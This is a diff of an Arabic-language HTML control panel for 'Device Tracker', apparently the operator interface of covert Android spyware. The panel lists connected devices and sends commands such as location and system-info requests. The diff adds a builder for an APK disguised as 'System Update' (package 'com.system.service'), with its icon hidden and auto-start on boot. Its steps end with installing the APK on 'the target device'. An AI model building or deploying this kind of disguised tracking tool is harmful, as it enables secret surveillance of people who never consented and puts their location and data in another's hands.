@@ -2,185 +2,118 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Device Tracker Pro - لوحة التحكم</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎮 لوحة التحكم - Device Tracker</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        /* ضمان ظهور الواجهة وعدم وجود أي إخفاء متعمد */
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #f4f7f6;
-            display: block !important;
-            visibility: visible !important;
-            opacity: 1 !important;
-        }
-        .screen {
-            display: none;
-            width: 100%;
-            height: 100%;
-        }
-        .screen.active {
-            display: flex;
-            flex-direction: column;
-        }
-    </style>
 </head>
 <body>
-    <!-- شاشة تسجيل الدخول -->
-    <div id="loginScreen" class="screen active">
-        <div class="login-container">
-            <div class="login-header">
-                <div class="logo-animation">
-                    <div class="logo-circle">
-                        <i class="fas fa-satellite-dish"></i>
-                    </div>
-                </div>
-                <h1 class="app-title">Device Tracker Pro</h1>
-                <p class="app-subtitle">نظام التحكم والمراقبة الاحترافي</p>
-            </div>
-            
-            <div class="login-form">
-                <div class="input-group">
-                    <label for="adminUsername">اسم المستخدم</label>
-                    <input type="text" id="adminUsername" placeholder="أدخل اسم المستخدم" value="admin">
-                </div>
-                
-                <div class="input-group">
-                    <label for="adminPassword">كلمة المرور</label>
-                    <input type="password" id="adminPassword" placeholder="أدخل كلمة المرور" value="admin">
-                </div>
-                
-                <button id="loginBtn" class="btn-login" onclick="handleLogin()">
-                    تسجيل الدخول
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- لوحة التحكم الرئيسية -->
-    <div id="dashboardScreen" class="screen">
-        <header class="dashboard-header">
-            <div class="header-right">
-                <div class="menu-toggle" onclick="toggleSidebar()">
-                    <i class="fas fa-bars"></i>
-                </div>
-                <div class="logo-small">
-                    <i class="fas fa-satellite-dish"></i>
-                    <span>Device Tracker</span>
-                </div>
-            </div>
-            <div class="header-left">
-                <div class="user-profile">
-                    <span id="displayUsername">Admin</span>
-                    <i class="fas fa-user-circle"></i>
-                </div>
-            </div>
+    <div class="container">
+        <header>
+            <h1>🎮 لوحة التحكم</h1>
+            <p>Device Tracker Control Panel v2.0</p>
         </header>
 
-        <div class="dashboard-body">
-            <!-- القائمة الجانبية -->
-            <nav class="sidebar" id="sidebar">
-                <div class="sidebar-nav">
-                    <a href="#" class="nav-item active" onclick="showSection('devices')">
-                        <i class="fas fa-mobile-alt"></i>
-                        <span>الأجهزة</span>
-                    </a>
-                    <a href="#" class="nav-item" onclick="showSection('commands')">
-                        <i class="fas fa-terminal"></i>
-                        <span>الأوامر</span>
-                    </a>
-                    <a href="#" class="nav-item" onclick="showSection('settings')">
-                        <i class="fas fa-cog"></i>
-                        <span>الإعدادات</span>
-                    </a>
+        <!-- تسجيل الدخول -->
+        <div id="loginSection" class="card">
+            <h2>🔐 تسجيل الدخول</h2>
+            <input type="text" id="adminUsername" placeholder="اسم المستخدم">
+            <input type="password" id="adminPassword" placeholder="كلمة المرور">
+            <button onclick="login()">دخول</button>
+        </div>
+
+        <!-- لوحة التحكم الرئيسية -->
+        <div id="dashboardSection" class="card" style="display:none;">
+            <div class="header-row">
+                <h2>📱 الأجهزة المتصلة</h2>
+                <button onclick="refreshDevices()" class="btn-refresh">🔄 تحديث</button>
+            </div>
+            <div id="devicesList" class="devices-grid"></div>
+            
+            <!-- تفاصيل الجهاز -->
+            <div id="deviceDetails" class="device-details" style="display:none;">
+                <h3>📊 الجهاز: <span id="selectedDeviceId"></span></h3>
+                <div class="info-grid">
+                    <div><strong>الحالة:</strong> <span id="deviceStatus"></span></div>
+                    <div><strong>آخر اتصال:</strong> <span id="deviceLastCheckIn"></span></div>
+                    <div><strong>Config ID:</strong> <span id="deviceConfigId"></span></div>
                 </div>
-                <button class="btn-logout" onclick="logout()">
-                    <i class="fas fa-sign-out-alt"></i>
-                    <span>خروج</span>
-                </button>
-            </nav>
+                
+                <h4>⚙️ إرسال أمر</h4>
+                <select id="commandType" onchange="toggleCustomAction()">
+                    <option value="get_system_info">📊 معلومات النظام</option>
+                    <option value="get_location">📍 الموقع</option>
+                    <option value="get_battery">🔋 البطارية</option>
+                    <option value="get_network">🌐 الشبكة</option>
+                    <option value="custom">🎮 أمر مخصص</option>
+                </select>
+                <input type="text" id="customAction" placeholder="الإجراء المخصص" style="display:none;">
+                <button onclick="sendCommand()" class="btn-send">📤 إرسال</button>            </div>
+        </div>
 
-            <!-- المحتوى الرئيسي -->
-            <main class="main-content">
-                <!-- قسم الأجهزة -->
-                <section id="devicesSection" class="section active">
-                    <div class="section-header">
-                        <h2>الأجهزة المتصلة</h2>
-                        <button class="btn-refresh" onclick="loadDevices()">تحديث</button>
-                    </div>
-                    <div class="devices-grid" id="devicesGrid">
-                        <!-- سيتم تحميل الأجهزة هنا -->
-                    </div>
-                </section>
+        <!-- ✨ ميزة جديدة: توليد APK Config -->
+        <div class="card config-generator">
+            <h3>✨ إنشاء APK مخصص</h3>
+            <p style="color:#aaa;font-size:0.9rem;margin-bottom:15px;">
+                ولّد إعدادات APK جديدة برابط خادم مخصص
+            </p>
+            
+            <label>🌐 رابط الخادم:</label>
+            <input type="url" id="configServerUrl" placeholder="https://your-server.com" value="">
+            
+            <label>📱 اسم التطبيق:</label>
+            <input type="text" id="configAppName" placeholder="System Update" value="System Update">
+            
+            <label>🆔 معرف التطبيق:</label>
+            <input type="text" id="configAppId" placeholder="com.system.service" value="com.system.service">
+            
+            <label>⏱️ فترة الاتصال (مللي ثانية):</label>
+            <input type="number" id="configCheckInInterval" value="30000">
+            
+            <label class="checkbox">
+                <input type="checkbox" id="configHideIcon" checked>
+                إخفاء أيقونة التطبيق
+            </label>
+            
+            <label class="checkbox">
+                <input type="checkbox" id="configAutoStart" checked>
+                التشغيل التلقائي عند الإقلاع
+            </label>
+            
+            <button onclick="generateConfig()" class="btn-generate">⚙️ توليد الإعدادات</button>
+            
+            <!-- نتيجة التوليد -->
+            <div id="configResult" class="config-result" style="display:none;">
+                <h4>✅ تم توليد الإعدادات!</h4>
+                <p><strong>Config ID:</strong> <span id="resultConfigId"></span></p>
+                
+                <h5>📋 انسخ هذا الكود في <code>hidden-apk/index.html</code>:</h5>
+                <pre id="resultHtmlSnippet" class="code-block"></pre>
+                
+                <button onclick="copyConfigCode()" class="btn-copy">📋 نسخ الكود</button>
+                
+                <div class="next-steps">
+                    <h5>🚀 الخطوات التالية:</h5>
+                    <ol>
+                        <li>انسخ الكود أعلاه</li>
+                        <li>افتح <code>hidden-apk/index.html</code> في GitHub</li>
+                        <li>استبدل محتوى <code><script id="app-config"></code> بالكود المنسوخ</li>                        <li>اعمل Commit → GitHub Actions سيبني APK جديد</li>
+                        <li>حمّل APK الجديد وثبّته على الجهاز الهدف</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
 
-                <!-- قسم الأوامر -->
-                <section id="commandsSection" class="section">
-                    <div class="section-header">
-                        <h2>إرسال أمر مخصص</h2>
-                    </div>
-                    <div class="command-box">
-                        <textarea id="customCommand" placeholder='{"type": "get_location"}' rows="5"></textarea>
-                        <div class="command-buttons">
-                            <button onclick="sendCustomCommand()">إرسال</button>
-                            <button class="secondary" onclick="clearCommand()">مسح</button>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- قسم الإعدادات -->
-                <section id="settingsSection" class="section">
-                    <div class="section-header">
-                        <h2>إعدادات النظام</h2>
-                    </div>
-                    <div class="settings-form">
-                        <div class="form-group">
-                            <label>رابط الخادم (Server URL)</label>
-                            <input type="text" id="settingServerUrl" placeholder="http://localhost:3000">
-                            <button onclick="saveServerSettings()">حفظ الإعدادات</button>
-                        </div>
-                    </div>
-                </section>
-            </main>
+        <!-- الإعدادات العامة -->
+        <div class="card settings">
+            <h3>⚙️ إعدادات اللوحة</h3>
+            <label>رابط الخادم للوحة:</label>
+            <input type="text" id="settingServerUrl" placeholder="https://your-server.com">
+            <button onclick="saveSettings()">💾 حفظ</button>
+            <button onclick="testConnection()" class="btn-test">🔗 اختبار</button>
+            <p id="connectionStatus" class="status"></p>
         </div>
     </div>
 
-    <!-- الإشعارات -->
-    <div id="notificationContainer" class="notification-container"></div>
-
     <script src="app.js"></script>
-    <script>
-        // دالة حفظ إعدادات الخادم من واجهة الإعدادات
-        function saveServerSettings() {
-            const url = document.getElementById('settingServerUrl').value.trim();
-            if (url) {
-                localStorage.setItem('SERVER_URL', url);
-                showNotification('تم حفظ رابط الخادم بنجاح', 'success');
-                setTimeout(() => location.reload(), 1000);
-            }
-        }
-        
-        // تحديث حقل الرابط عند فتح الإعدادات
-        function updateSettingsUI() {
-            document.getElementById('settingServerUrl').value = localStorage.getItem('SERVER_URL') || '';
-        }
-        
-        // ربط الدوال الإضافية
-        const originalShowSection = window.showSection;
-        window.showSection = function(id) {
-            if (id === 'settings') updateSettingsUI();
-            if (typeof originalShowSection === 'function') originalShowSection(id);
-            else {
-                document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-                document.getElementById(id + 'Section').classList.add('active');
-                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-                event.currentTarget.classList.add('active');
-            }
-        };
-    </script>
 </body>
 </html>
